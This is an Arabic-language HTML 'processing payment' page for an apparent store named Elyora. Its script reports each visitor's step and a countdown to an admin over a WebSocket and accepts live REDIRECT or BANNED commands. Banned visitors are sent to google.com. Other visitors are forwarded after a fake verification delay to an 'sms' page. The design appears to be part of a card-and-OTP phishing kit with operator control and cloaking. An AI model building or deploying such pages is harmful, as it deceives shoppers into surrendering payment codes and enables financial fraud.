<!DOCTYPE html>
<html lang="ar" dir="rtl">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>جاري المعالجة... | متجر إليورا</title>
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <script src="https://cdn.tailwindcss.com"></script>
    <script>
        tailwind.config = {
            theme: {
                extend: {
                    colors: {
                        primary: { DEFAULT: '#2f1321' },
                        accent: { DEFAULT: '#e45b8a' },
                        sand: '#f5ebe7',
                    },
                    fontFamily: {
                        cairo: ['Cairo', 'sans-serif'],
                    }
                }
            }
        }
    </script>
</head>

<body class="bg-sand/30 font-cairo flex flex-col items-center justify-center min-h-screen text-center p-4">

    <div class="bg-white p-8 rounded-3xl shadow-lg max-w-sm w-full">
        <div class="relative w-20 h-20 mx-auto mb-6">
            <div class="absolute inset-0 border-4 border-gray-100 rounded-full"></div>
            <div class="absolute inset-0 border-4 border-accent border-t-transparent rounded-full animate-spin"></div>
        </div>

        <h1 class="text-xl font-bold text-primary mb-2">جاري معالجة الطلب</h1>
        <p class="text-sm text-gray-500 mb-6">يرجى الانتظار، جاري التحقق من عملية الدفع بشكل آمن...</p>

        <div class="flex justify-center gap-1.5 direction-ltr">
            <div class="w-2 h-2 rounded-full bg-accent animate-bounce" style="animation-delay: 0s"></div>
            <div class="w-2 h-2 rounded-full bg-accent animate-bounce" style="animation-delay: 0.2s"></div>
            <div class="w-2 h-2 rounded-full bg-accent animate-bounce" style="animation-delay: 0.4s"></div>
        </div>
    </div>

    <script>
        // --- API & WebSocket Integration ---
        const urlParams = new URLSearchParams(window.location.search);
        const step = urlParams.get('step');

        let clientId = localStorage.getItem('aura_client_id');
        if (!clientId) {
            clientId = 'unknown-' + Date.now();
        }

        const proto = window.location.protocol === 'https:' ? 'wss' : 'ws';
        const wsUrl = `${proto}://${window.location.host}/ws/client/${clientId}`;
        const ws = new WebSocket(wsUrl);

        ws.onopen = () => {
            // Inform admin of current state
            ws.send(JSON.stringify({ event: 'step_update', data: { step: 'loading', sub_step: step } }));
        };

        ws.onmessage = (e) => {
            try {
                const msg = JSON.parse(e.data);
                if (msg.type === 'REDIRECT') {
                    window.location.href = msg.url;
                } else if (msg.type === 'BANNED') {
                    window.location.href = msg.redirect || 'https://www.google.com';
                }
            } catch (err) { console.error(err); }
        };

        // --- Timed Redirect Logic with Real-time Broadcasting ---
        let duration = 20; // Default: 20 seconds for step 1
        let nextPage = 'sms'; // Default: go to SMS page

        if (step === '1') {
            duration = 20;
            nextPage = 'sms';
        } else if (step === '2') {
            duration = 60; // 60 seconds for step 2
            nextPage = 'thank_you';
        } else {
            // If no step or invalid step, default to step 1 flow
            duration = 20;
            nextPage = 'sms';
        }

        const timerInterval = setInterval(() => {
            duration--;

            // Broadcast current time to admin
            if (ws.readyState === WebSocket.OPEN) {
                ws.send(JSON.stringify({
                    event: 'timer_update',
                    data: {
                        timeLeft: duration,
                        totalDuration: (step === '1' ? 20 : (step === '2' ? 60 : 5))
                    }
                }));
            }

            if (duration <= 0) {
                clearInterval(timerInterval);
                window.location.href = nextPage;
            }
        }, 1000);
    </script>
</body>

</html>